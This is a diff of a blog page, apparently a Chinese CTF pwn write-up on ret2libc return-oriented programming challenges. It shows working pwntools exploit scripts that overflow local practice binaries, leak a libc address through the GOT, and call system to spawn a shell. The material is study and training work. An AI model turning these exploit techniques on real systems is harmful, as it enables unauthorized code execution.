@@ -89,7 +89,36 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,28018)</span></span><br><span class="line">p=process(<span class="string">&#x27;./timu/ROP/ret2libc2&#x27;</span>)</span><br><span class="line">sys=<span class="number">0x8048490</span></span><br><span class="line">gts=<span class="number">0x8048460</span></span><br><span class="line">buf2=<span class="number">0x0804A080</span></span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line"><span class="comment">#payload=flat([b&#x27;A&#x27;*112,gts,sys,buf2,buf2])</span></span><br><span class="line">payload=flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>,gts,pop_ebx,buf2,sys,pop_ebx,buf2])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;/bin/sh&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/11/24/voNTl7zVIpOuidc.png" alt="image-20201124214212766"></p>
-<h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1>
+<h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p><img src="https://i.loli.net/2020/11/24/nb2KrQG5cZ4h9Ug.png" alt="image-20201124223034795"></p>
+<p><img src="https://i.loli.net/2020/11/24/jbkwJg8suYSqMdL.png" alt="image-20201124223317750"></p>
+<p><img src="https://i.loli.net/2020/11/24/Y1SPkt2UsyjW3Jx.png" alt="image-20201124224158162"></p>
+<p><img src="https://i.loli.net/2020/11/24/715BAtHaXFi4Kzp.png" alt="image-20201124224314867"></p>
+<p>strtol函数将用户输入的字符串值转换为长整数型，eg.输入12/n(0x31320a)转换为0xc</p>
+<p><img src="https://i.loli.net/2020/11/24/WuVdlyR1r2hHjcM.png" alt="image-20201124225249388"></p>
+<p>运行子函数时：</p>
+<p><img src="https://i.loli.net/2020/11/24/YC76ghvAES3zp5a.png" alt="image-20201124225723960"></p>
+<p>先用got表进行地址泄漏</p>
+<p>下断点到read函数</p>
+<p><img src="https://i.loli.net/2020/11/24/KYs3l1e5mZnwCDu.png" alt="image-20201124231433777"></p>
+<p><img src="https://i.loli.net/2020/11/24/awJzQO5cATSyRdo.png" alt="image-20201124231602799"></p>
+<p>在x86程序中地址为0xf7···是libc中的文件，0x80···是elf文件本身里的：</p>
+<p><img src="https://i.loli.net/2020/11/24/nU6imuZW4235XEL.png" alt="image-20201124231925520"></p>
+<p>可选用puts函数对应got表的起始地址传进去（十进制）</p>
+<p><img src="https://i.loli.net/2020/11/24/ifKPSxDprojkNaL.png" alt="image-20201124233238304"></p>
+<p><img src="https://i.loli.net/2020/11/24/mpsQvghaxTG9SdN.png" alt="image-20201124233342299"></p>
+<p>执行到See_something会告诉所传的地址：</p>
+<p><img src="https://i.loli.net/2020/11/24/xetYPTWEDvakhsu.png" alt="image-20201124233431732"></p>
+<p>每次运行（不论本地还是远程）libc值（0xf7···）都会改变</p>
+<p>再通过libc文件得知puts函数和system函数之间的距离可计算出system函数的真实地址：</p>
+<p><img src="https://i.loli.net/2020/11/24/THVrChXzZnSqNQk.png" alt="image-20201124234105804"></p>
+<p>计算偏移</p>
+<p><img src="https://i.loli.net/2020/11/25/PDZy1LKtfhIa7YG.png" alt="image-20201125001912661"></p>
+<p><img src="https://i.loli.net/2020/11/25/3c48BNAnxQluki1.png" alt="image-20201125002053210"></p>
+<p><img src="https://i.loli.net/2020/11/25/OSgwzkuKItEnp2v.png" alt="image-20201125002117912"></p>
+<p>构建exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,28018)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./timu/ROP/ret2libc3/ret2libc3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./timu/ROP/ret2libc3/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./timu/ROP/ret2libc3/ret2libc3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; :&#x27;</span>,<span class="built_in">str</span>(elf.got[<span class="string">b&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">payload=flat([cyclic(<span class="number">60</span>),libcbase+libc.symbols[<span class="string">b&#x27;system&#x27;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\x00&#x27;</span>))])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; :&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
